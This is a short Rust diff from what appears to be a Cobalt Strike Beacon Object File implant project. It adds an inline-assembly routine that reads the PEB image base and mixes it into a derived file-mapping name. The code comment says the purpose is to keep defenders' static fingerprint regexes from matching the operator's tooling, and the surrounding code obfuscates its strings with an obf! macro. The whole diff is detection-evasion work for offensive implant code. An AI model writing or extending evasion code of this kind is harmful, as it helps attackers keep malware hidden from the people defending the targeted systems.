@@ -644,6 +644,28 @@ unsafe fn global_alloc_zeroed(size: usize) -> *mut c_void {
     }
 }
 
+/// Read the low 32 bits of `PEB->ImageBaseAddress` on x86_64 via `gs:[0x60]`.
+/// Returns 0 if PEB is unreadable. Used to mix Beacon-spawn-unique entropy
+/// into derived names (e.g. the BofState file mapping) so a static fingerprint
+/// regex over Local\<8hex> can't pre-match the operator's tooling.
+#[inline(always)]
+unsafe fn read_peb_image_base_lo() -> u32 {
+    unsafe {
+        let peb: *const u8;
+        core::arch::asm!(
+            "mov {}, gs:[0x60]",
+            out(reg) peb,
+            options(nostack, preserves_flags),
+        );
+        if peb.is_null() {
+            return 0;
+        }
+        let image_base_ptr = peb.add(0x10) as *const usize;
+        let ib = core::ptr::read(image_base_ptr);
+        ib as u32
+    }
+}
+
 unsafe fn bof_state_name() -> Vec<u8> {
     unsafe {
         type GetPidFn = unsafe extern "system" fn() -> u32;
@@ -656,8 +678,12 @@ unsafe fn bof_state_name() -> Vec<u8> {
         for &b in &pid_bytes {
             h = h.wrapping_mul(33).wrapping_add(b as u32);
         }
+        // Mix Beacon-spawn-unique entropy (PEB ImageBase, ASLR-randomised) so
+        // the derived 8-hex string differs per Beacon process. Fallback to 0
+        // (perilaku lama) if PEB read fails.
+        let image_base_lo = read_peb_image_base_lo();
         const MAGIC: u32 = 0xA1B2_C3D4;
-        let name_val = h ^ MAGIC;
+        let name_val = h ^ image_base_lo ^ MAGIC;
         let prefix = obf!("Local\\");
         let prefix_bytes = prefix.as_bytes();
         let mut name = Vec::with_capacity(16);
